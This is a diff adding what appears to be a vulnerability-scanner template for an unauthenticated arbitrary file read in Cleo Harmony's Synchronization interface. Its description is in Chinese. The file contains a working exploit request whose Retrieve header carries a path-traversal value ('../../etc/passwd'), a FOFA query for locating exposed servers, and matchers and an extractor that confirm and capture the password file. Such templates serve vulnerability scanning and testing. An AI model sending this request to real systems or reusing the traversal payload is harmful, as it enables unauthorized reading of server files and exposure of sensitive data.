@@ -1,0 +1,27 @@
+## id: VEID-2025-0114
+## name: Cleo Harmony接口Synchronization存在任意文件读取漏洞
+## author: hack007x
+## severity: high
+## tags: veid,file,veid2025
+## description: Cleo Harmony的Synchronization接口存在任意文件读取漏洞，未经身份验证的攻击者可以通过漏洞读取服务器任意文件，从而获取大量敏感信息。
+## fofa-query: body="packages/partnerlogos/userportal_logo"
+## verification: true
+
+
+GET /Synchronization HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Retrieve: l=Ab1234-RQ0258;n=VLTrader;v=7.2.1;a=1337;po=1337;s=True;b=False;pp=1337;path=../../etc/passwd
+
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: header["Content-Type"] contains "plain" 
+#@ matcher: body matches /root:[^:]*:[0-9]+:[0-9]+:/
+#> extract: name=etc_passwd, from=body, regex=/(root:[^:]*:[0-9]+:[0-9]+:[^:]*:[^:]*:\/[^\n]+)/, group=1
+
+
+
+
+
+# @VEIL-STAMP: 1d7a1b40aabcde4c863c719454e60292c497acba66cb45ed1f85e7d5bd56034b
